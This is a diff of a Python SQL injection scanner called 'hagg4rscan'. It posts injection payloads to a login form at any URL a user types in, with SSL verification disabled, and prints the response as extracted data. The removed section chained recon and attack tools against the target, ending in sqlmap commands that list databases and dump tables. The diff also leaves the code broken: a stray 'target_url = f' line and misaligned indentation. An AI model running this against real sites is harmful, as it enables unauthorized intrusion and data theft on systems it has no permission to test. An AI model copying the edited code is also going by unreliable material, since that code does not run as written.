@@ -53,7 +53,7 @@ def print_header():
     """Print the header 'hagg4rscan'."""
     header = """
     \033[91m
-          ___           ___           ___           ___           ___           ___     
+              ___           ___           ___           ___           ___           ___     
      /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
      \:\  \       /::\  \       /:/ _/_       /:/ _/_       /::\  \       /::\  \   
       \:\  \     /:/\:\  \     /:/ /\  \     /:/ /\  \     /:/\:\  \     /:/\:\__\  
@@ -65,6 +65,7 @@ def print_header():
     \:\__\        \:\__\        \::/  /       \::/  /       \:\__\        \:\__\    
      \/__/         \/__/         \/__/         \/__/         \/__/         \/__/    
                                                                                                                                                     
+                                                                     
     \033[0m
     """
     print(header)
@@ -95,16 +96,14 @@ def perform_sql_injection(target_url):
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
-            'password': 'admin'  # Update with the correct password field if needed
+            'password': 'password'  # Update with the correct password field if needed
         }
 
         try:
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            if "error" not in response.text.lower():  # Simple check for error messages
-                print(f"Payload succeeded: {payload}")
+            if "error" not in response.text.lower():  # Simplified check, should be adapted
+                print(response.text)  # This will display the extracted data, handle it as you wish
                 vulnerable = True
-            else:
-                print(f"Payload failed: {payload}")
         except SSLError as e:
             print(f"SSL Error: {e}")
         except RequestException as e:
@@ -135,72 +134,31 @@ def main():
     print_header()
 
     target_url = input("Enter the URL of the website to check: ")
-    if not target_url.startswith("http://") and not target_url.startswith("https://"):
-        target_url = "https://" + target_url
+    target_url = f
     
-        if check_website_status(target_url):
+        # Ensure the URL starts with 'http://' or 'https://'
+    if not target_url.startswith(('http://', 'https://')):
+        target_url = 'http://' + target_url
+
+    # Check if the website is accessible
+    if check_website_status(target_url):
+        print("Starting SQL Injection test...")
         if perform_sql_injection(target_url):
-            print(f"The website {target_url} is vulnerable to SQL Injection.")
+            print("The website is vulnerable to SQL Injection.")
         else:
-            print(f"The website {target_url} is not vulnerable to SQL Injection.")
-        
-        # Determine the desktop path
-        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-        target_dir = os.path.join(desktop_path, target_url.replace("https://", "").replace("http://", ""))
-        os.makedirs(target_dir, exist_ok=True)
-        output_file = os.path.join(target_dir, "domain.txt")
-        
-        # Clear the file if it exists
-        open(output_file, 'w').close()
-        
-        tools = {
-            "subfinder": ["sudo", "subfinder", "-d", target_url, "-o", output_file],
-            "sqlmap": ["sqlmap", "--url", target_url],
-            "whois": ["whois", target_url],
-            "nikto": ["nikto", "-h", target_url],
-            "uniscan": ["uniscan", "-u", target_url, "-qd"],
-            "nmap": ["nmap", target_url],
-        }
-
-        total_tools = len(tools)
-        
-        for i, (tool_name, command) in enumerate(tools.items(), 1):
-            print(f"Esecuzione di {tool_name} ({i}/{total_tools})...")
-            stdout, stderr = run_command(command)
-            save_to_file(output_file, f"=== Risultati {tool_name} ===\n")
-            if stdout:
-                save_to_file(output_file, stdout)
-            if stderr:
-                save_to_file(output_file, f"Errori:\n{stderr}")
-            
-            # Calculate and print the progress
-            progress = (i / total_tools) * 100
-            print(f"Progresso: {progress:.2f}%")
-
-        # Execute additional SQLMap commands to retrieve database information
-        additional_sqlmap_commands = [
-            f"sqlmap -u {target_url} --dbs",
-            f"sqlmap -u {target_url} --tables -D your_database_name",
-            f"sqlmap -u {target_url} --columns -D your_database_name -T your_table_name",
-            f"sqlmap -u {target_url} --dump -D your_database_name -T your_table_name"
-        ]
-        
-        for command in additional_sqlmap_commands:
-            print(f"Esecuzione di comando SQLMap: {command}")
-            stdout, stderr = run_command(command.split())
-            save_to_file(output_file, f"=== Risultati SQLMap ===\n")
-            if stdout:
-                save_to_file(output_file, stdout)
-            if stderr:
-                save_to_file(output_file, f"Errori:\n{stderr}")
-            
-            # Calculate and print the progress
-            progress = (i / total_tools) * 100
-            print(f"Progresso: {progress:.2f}%")
-
-        print("Analisi completata. I risultati sono stati salvati in:", output_file)
+            print("The website is not vulnerable to SQL Injection.")
     else:
-        print("Interruzione del programma poiché il sito web non è accessibile.")
+        print("Cannot proceed with SQL Injection tests as the website is not accessible.")
 
 if __name__ == "__main__":
     main()
+
+
+
+
+
+
+
+
+
+
